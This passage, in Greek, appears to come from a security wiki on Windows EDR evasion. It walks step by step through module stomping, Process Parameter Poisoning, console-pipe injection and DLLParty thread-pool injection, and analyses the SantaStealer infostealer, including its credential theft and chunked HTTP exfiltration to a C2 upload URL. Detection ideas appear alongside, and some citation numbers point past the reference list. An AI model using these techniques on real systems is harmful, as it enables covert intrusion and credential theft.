- Τοποθετήστε σε ουρά τα προετοιμασμένα `CONTEXT` frames/APCs με το `NtQueueApcThread` και εκτελέστε τα με το `NtAlertResumeThread`.
- Αποθηκεύστε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγετε την εξάντληση του προεπιλεγμένου stack των 64 KB του thread.
- Χρησιμοποιήστε το `NtSignalAndWaitForSingleObject` για να σημάνετε ατομικά το start event και να μπλοκάρετε.
- Κάντε suspend το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειωθεί το χρονικό παράθυρο race στο οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που έχει αποκατασταθεί μόνο εν μέρει.

Αυτό αντικαθιστά την υπογραφή `CreateTimerQueueTimer` + `NtContinue` με υπογραφή helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` και στη συνέχεια απευθείας εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που καταλήγουν έμμεσα στο `SystemFunction032`, στο `VirtualProtect` ή σε helpers αποκατάστασης δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το module stomping εκτελεί payloads από το **`.text` section ενός DLL που έχει ήδη γίνει map μέσα στη διεργασία-στόχο**, αντί να δεσμεύει εμφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο, disk-backed image**, του οποίου ο χώρος κώδικα μπορεί να χωρέσει το payload χωρίς να αλλοιώσει code paths που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε συνηθισμένα modules, όπως τα `uxtheme.dll` ή `comctl32.dll`, είναι εύθραυστο: το DLL μπορεί να μην έχει φορτωθεί στην remote διεργασία, ενώ μια περιοχή κώδικα που είναι υπερβολικά μικρή θα προκαλέσει crash της διεργασίας. Μια πιο αξιόπιστη ροή εργασίας είναι:

1. Απαριθμήστε τα modules της διεργασίας-στόχου και διατηρήστε μια **λίστα include μόνο με ονόματα** των DLL που έχουν ήδη φορτωθεί.
2. Δημιουργήστε πρώτα το payload και καταγράψτε το **ακριβές μέγεθός του σε bytes**.
3. Σαρώστε υποψήφια DLL στον δίσκο και συγκρίνετε το PE section **`.text` `Misc_VirtualSize`** με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αντιστοιχεί στο μέγεθος του εκτελέσιμου section **όταν γίνει map στη μνήμη**.
4. Αναλύστε τον **Export Address Table (EAT)** και επιλέξτε το RVA μιας exported function ως αρχικό offset για το stomp.
5. Υπολογίστε το **blast radius**: αν το payload ξεπερνά τα όρια της επιλεγμένης συνάρτησης, θα αντικαταστήσει γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Τυπικά βοηθητικά εργαλεία recon/επιλογής που συναντώνται στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Προτίμησε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, ώστε να αποφύγεις την τηλεμετρία των `LoadLibrary`/μη αναμενόμενων image loads.
- Προτίμησε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο, διαφορετικά οι κανονικές διαδρομές κώδικα μπορεί να εκτελέσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν την αλλαγή του τρόπου ενσωμάτωσης του shellcode από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον πηγαίο κώδικα του injector.

Ιδέες για εντοπισμό
- Απομακρυσμένες εγγραφές σε **εκτελέσιμες σελίδες που υποστηρίζονται από image** (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές εκχωρήσεις RWX/RX.
- Σημεία εισόδου exports των οποίων τα bytes στη μνήμη δεν ταιριάζουν πλέον με το αντίστοιχο αρχείο στον δίσκο.
- Απομακρυσμένα threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε export νόμιμου DLL του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε μια διεργασία-στόχο που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης του `CreateProcessW` στη θυγατρική διεργασία** και τις αποθηκεύουν στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers που αντιγράφονται από το `CreateProcessW`

Χρήσιμοι carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για το `CreateProcessW` και περιορίζεται στους **32.767 χαρακτήρες Unicode**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα Unicode environment block από διαδοχικές συμβολοσειρές `NAME=VALUE\0`, οι οποίες τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση `ShellInfo` πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερή, τεκμηριωμένη σύμβαση.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί τη θυγατρική διεργασία με δεδομένα εκκίνησης που ελέγχει ο επιτιθέμενος και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς remote write APIs

Μετά τη δημιουργία της θυγατρικής διεργασίας, εντόπισε το αντιγραμμένο buffer με **μόνο για ανάγνωση** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW` και όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργία της διεργασίας κανονικά (όχι σε αναστολή)
2. Μετατροπή της επιλεγμένης σελίδας παραμέτρων σε εκτελέσιμη με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποίηση του handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατεύθυνση της εκτέλεσης με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας thread hijacking, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του handle του κύριου thread που επιστράφηκε.

Αυτό αποφεύγει αρκετά API που συνήθως παρακολουθούνται για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά και τα `SuspendThread` / `ResumeThread`

### Περιορισμός byte null και staged shellcode

Και οι τρεις φορείς είναι **string ή δεδομένα τύπου string**, επομένως ένα ακατέργαστο payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free πρώτο stage** που ανακατασκευάζει constants κατά τον χρόνο εκτέλεσης και στη συνέχεια φορτώνει ένα αυθαίρετο δεύτερο stage.

Ένα απλό μοτίβο είναι η σύνθεση constants με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο first stage να δημιουργεί συμβολοσειρές στη στοίβα, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου, χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API από το first stage μέσω της στοίβας

Όταν το first stage πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push τη συμβολοσειρά/το buffer στη στοίβα του target
- δεσμεύσει το **32-byte x64 shadow space**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο στα 16 bytes** πριν από την κλήση

Στη συνέχεια, ένα δεύτερο stage μπορεί να αντιγραφεί από τη στοίβα σε μια δέσμευση `PAGE_READWRITE`, να αλλάξει σε `PAGE_EXECUTE_READ` με το `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση δέσμευση RWX.

### Ιδέες για ανίχνευση

Καλές ευκαιρίες για hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν εκτελέσιμες τις σελίδες των παραμέτρων διεργασίας
- αυτή η αλλαγή δικαιωμάτων ακολουθούμενη από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του ένας πλήρης μηχανισμός εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή των δικαιωμάτων της σε εκτέλεσης και μια μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή εσωτερικά καταλήγει σε ύποπτες primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

Για παράδοση payload σε μια **υπάρχουσα** διεργασία Windows μέσω περιγραφών νημάτων και, στη συνέχεια, hijacking της διεύθυνσης επιστροφής ενός νήματος που βρίσκεται σε αναμονή, δείτε το [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Injection μέσω pipe του Console STDIN

Μια θυγατρική διεργασία console με αλληλεπίδραση μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο της θυγατρικής διεργασίας σε ένα pipe και στέλνει έναν marker ακολουθούμενο από shellcode. Αφού το πρόγραμμα console διαβάσει τα δεδομένα στη δική του ιδιωτική μνήμη, ο injector εντοπίζει αυτό το buffer, το καθιστά εκτελέσιμο και ανακατευθύνει ένα νήμα της θυγατρικής διεργασίας σε αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά εξακολουθεί να πρόκειται για process injection και όχι για μια γενική παράκαμψη EDR.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **ανώνυμο pipe**. Τα Windows υλοποιούν εσωτερικά τα ανώνυμα pipes με αντικείμενα pipe που έχουν μοναδικά ονόματα, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles που μπορούν να κληρονομηθούν, με έναν προεπιλεγμένο περιγραφέα ασφαλείας, τοποθετεί το handle ανάγνωσης στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί μια νέα θυγατρική διεργασία με ενεργοποιημένη την κληρονόμηση handles. Επομένως, αυτό το PoC εκκινεί το εκτελέσιμο console που του παρέχεται· δεν συνδέει το pipe σε μια υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την ακόλουθη ακολουθία:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη ανώνυμων pipes για τα `STDIN` και `STDOUT` της θυγατρικής διεργασίας. Απενεργοποιεί την κληρονόμηση στα δύο handles της πλευράς του parent και κλείνει στον parent τα αντίγραφα των handles της πλευράς του child μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με το `CREATE_NEW_CONSOLE`. Το child κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον δυαδικό πίνακα `rawData` με το `WriteFile`, μέσω του handle `STDIN` της πλευράς του parent. Το πρόγραμμα console καταναλώνει τα bytes και αφήνει ένα αντίγραφό τους σε μία από τις ιδιωτικές δεσμευμένες περιοχές του.
4. Διατρέχει τον χώρο διευθύνσεων του child με το `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με το `ReadProcessMemory` και αναζητά τον marker στην αρχή του `rawData`.
5. Αλλάζει τα δικαιώματα του εντοπισμένου buffer σε `PAGE_EXECUTE_READWRITE` με το `VirtualProtectEx`.
6. Εντοπίζει το κύριο νήμα, το αναστέλλει, ορίζει το `RIP` σε `found_address + 0x19` με το `NtSetContextThread` και το επαναφέρει σε εκτέλεση.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδική για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` αρχίζει με δείκτη 25 byte, επομένως τα εκτελέσιμα byte ξεκινούν στη δεκαεξαδική μετατόπιση `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε ταυτόχρονα τον δείκτη, το διάνυσμα αναζήτησης, το μέγεθος του πίνακα και τη μετατόπιση εκτέλεσης. Τα σχόλια του πηγαίου κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως κακούς χαρακτήρες. Αυτή η ροή εργασίας δεν τροποποιεί το token ή τα προνόμια της θυγατρικής διεργασίας.<sup>[[41]](#references)</sup>

Για μικρά native helpers και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Έγχυση DLL μέσω callback thread-pool χωρίς shellcode (DLLParty)

Το DLLParty προσαρμόζει την έγχυση thread-pool τύπου PoolParty, ώστε ένας υπάρχων worker της διεργασίας-στόχου να καλεί τη `LoadLibraryA`, αντί να εκτελεί ένα injected callback stub. Ο μηχανισμός dispatch είναι ένα completion `TP_DIRECT` που τοποθετείται στην ουρά του I/O completion port του target pool. Αυτό δεν παρακάμπτει τα δικαιώματα διεργασιών: το PoC καλεί `OpenProcess(PROCESS_ALL_ACCESS)` και χρειάζεται μνήμη της διεργασίας-στόχου με δικαιώματα ανάγνωσης/εγγραφής, καθώς και handles worker-factory και completion-port που μπορούν να αντιγραφούν.<sup>[[46]](#references)[[47]](#references)</sup>

Στα Windows x64, ο worker περνά έναν δείκτη προς το `TP_CALLBACK_INSTANCE` που βρίσκεται στη στοίβα του, μέσω του `RCX`, του πρώτου ορίσματος callback. Η `LoadLibraryA` ερμηνεύει τον ίδιο δείκτη ως `LPCSTR`. Στη διαδρομή που δοκιμάστηκε, η `TppWorkerThread` δημιουργεί τον δείκτη στο `RSP+0x178`, ενώ η πρώτη συνήθης εγγραφή της σε αυτό το αντικείμενο γίνεται στο `RSP+0x1d0`. Επομένως, μια διαδρομή DLL με χαρακτήρα τερματισμού null, εφόσον χωρά στο πρόθεμα των 0x58 byte, μπορεί να τοποθετηθεί στην αρχή του instance χωρίς να αντικατασταθεί πριν από το dispatch. Πρόκειται για παρατήρηση ειδική για αυτήν την έκδοση, όχι για τεκμηριωμένη εγγύηση του Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Η ροή εργασίας αναφοράς είναι η εξής:<sup>[[46]](#references)[[47]](#references)</sup>

1. Απαριθμήστε τα handles του στόχου με το `NtQuerySystemInformation(SystemHandleInformation)` και εντοπίστε το `TpWorkerFactory` ανακτώντας τους τύπους αντικειμένων. Αντιγράψτε ένα handle worker-factory και ανακτήστε το `WorkerFactoryBasicInformation`· το `StartParameter` δίνει το απομακρυσμένο `TP_POOL`. Παραλείψτε factories με `TotalWorkerCount == 0`.
2. Διαβάστε το `TP_POOL.CompletionPort` και διασχίστε την ιδιωτική λίστα worker του pool. Στην έκδοση Windows 10 19045 x64 που δοκιμάστηκε (`ntdll.dll 10.0.19041.4842`), η κεφαλή της βρίσκεται στο `pool+0x60`· κάθε σύνδεσμος βρίσκεται στο `worker+0x10`, επομένως η θέση callback-instance στο `worker+0x38` ισούται με `link+0x28`. Το PoC ελέγχει την ευθυγράμμιση των δεικτών, την αμοιβαιότητα των συνδέσμων, την ιδιοκτησία του pool, τα μη μηδενικά αναγνωριστικά νημάτων, τους επαναλαμβανόμενους κόμβους και μια σταθερή κεφαλή λίστας.
3. Γράψτε τη διαδρομή DLL σε **κάθε** θέση worker που ανακτήθηκε, επειδή οποιοσδήποτε worker μπορεί να καταναλώσει το completion που μπήκε στην ουρά. Τοποθετήστε ένα `TP_DIRECT` με `Callback = LoadLibraryA` σε εγγράψιμη μνήμη του στόχου. Το PoC χρησιμοποιεί το `last_slot-0x500` στη στοίβα ενός worker αντί για `VirtualAllocEx`· αυτή η μετατόπιση είναι πειραματική και δεν πρέπει να συμπίπτει με ενεργά δεδομένα της στοίβας.
4. Αντιγράψτε το handle του completion port του στόχου και καλέστε το `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Η διεύθυνση του απομακρυσμένου `TP_DIRECT` είναι το completion key. Ένας υπάρχων worker καλεί έπειτα τη `LoadLibraryA` με τον αντικατεστημένο δείκτη callback-instance και φορτώνει μια DLL στην οποία έχει ήδη πρόσβαση ο στόχος.

Το PoC δέχεται ένα PID στόχου (`DLLParty.exe <target_pid>`) και χρησιμοποιεί μια σταθερά ορισμένη διαδρομή DLL στο `DLLParty.cpp`· ορίστε μια διαδρομή στην οποία έχει πρόσβαση ο στόχος πριν από τη δημιουργία ενός εκτελέσιμου x64. Χρησιμοποιεί επίσης τη διεύθυνση `LoadLibraryA` της δικής του διεργασίας ως απομακρυσμένο callback, άρα προϋποθέτει ότι αυτή η διεύθυνση είναι έγκυρη και στον στόχο. Ο κώδικας δεν ελέγχει αν το μήκος της διαδρομής χωρά στο πρόθεμα των 0x58 byte ούτε αν η διάσχιση των workers εντόπισε κάποια θέση προτού προσπελάσει το τελευταίο στοιχείο. Επαληθεύστε ξανά τις ιδιωτικές μετατοπίσεις, τη διάταξη της στοίβας και τον εγγράψιμο χώρο για την έκδοση-στόχο. Η παράλειψη των `CreateRemoteThreadEx`, shellcode και `VirtualAllocEx` δεν εξαλείφει τις εγγραφές μεταξύ διεργασιών ή την τηλεμετρία φόρτωσης DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Τεχνικές SantaStealer για αποφυγή εντοπισμού χωρίς αρχεία και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν την παράκαμψη AV, το anti-analysis και την πρόσβαση σε διαπιστευτήρια σε μία ενιαία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία ρυθμίσεων (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω της `GetKeyboardLayoutList`. Αν βρεθεί διάταξη κυριλλικού πληκτρολογίου, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει stealers, ώστε να μην ενεργοποιηθεί ποτέ σε εξαιρούμενες τοπικές ρυθμίσεις, αφήνοντας παράλληλα ένα τεκμήριο για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Πολυεπίπεδη λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει ένα custom rolling checksum για κάθε όνομα και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes. Επαναλαμβάνει τον υπολογισμό checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας όπως το `C:\analysis`.
- Η παραλλαγή B εξετάζει ιδιότητες του συστήματος (κατώτατο όριο πλήθους διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να ανιχνεύσει τα VirtualBox additions και εκτελεί ελέγχους χρονισμού γύρω από sleep για να εντοπίσει single-stepping. Αν εντοπιστεί οποιαδήποτε ένδειξη, η εκτέλεση διακόπτεται πριν από την εκκίνηση των modules.

### Fileless helper + διπλό reflective loading με ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε αποθηκεύεται στον δίσκο είτε γίνεται manually mapped στη μνήμη. Σε fileless mode, επιλύει μόνο του τα imports/relocations, ώστε να μην αποθηκεύονται βοηθητικά artifacts.
- Αυτό το helper αποθηκεύει ένα DLL δεύτερου σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά των 32 bytes και δύο nonces των 12 bytes). Μετά και τα δύο περάσματα, φορτώνει το blob με reflective loading (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για να κάνουν inject σε ένα ενεργό Chromium browser, να κληρονομήσουν τα κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν passwords/cookies/credit cards απευθείας από βάσεις δεδομένων SQLite, παρά τις ενισχύσεις ασφαλείας του ABE.

### Αρθρωτή συλλογή στη μνήμη και HTTP exfil σε chunks

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα function pointers `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, documents, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε κοινόχρηστους buffers και αναφέρει τον αριθμό των αρχείων του μετά από παράθυρο αναμονής ~45s για τα threads.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Έπειτα, το `ThreadPayload1` περιμένει 15s και μεταδίδει το αρχείο σε chunks των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Σε κάθε chunk προστίθενται τα `User-Agent: upload`, `auth: <build_id>` και, προαιρετικά, το `w: <campaign_tag>`. Στο τελευταίο chunk προστίθεται το `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασύνθεση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής: Ακριβές module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στις δωρεάν ευκαιρίες για malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC για πλαστογράφηση call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων posture του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξέταση προηγούμενων επιχειρήσεων ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάστε το προστατευτικό περίβλημα του Windows Defender με την τεχνική ανακατεύθυνσης φακέλου](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την αγνή πρόσοψη: Από RAT σε builder και coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Το SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση malware Node.js με API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Ωραία Κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
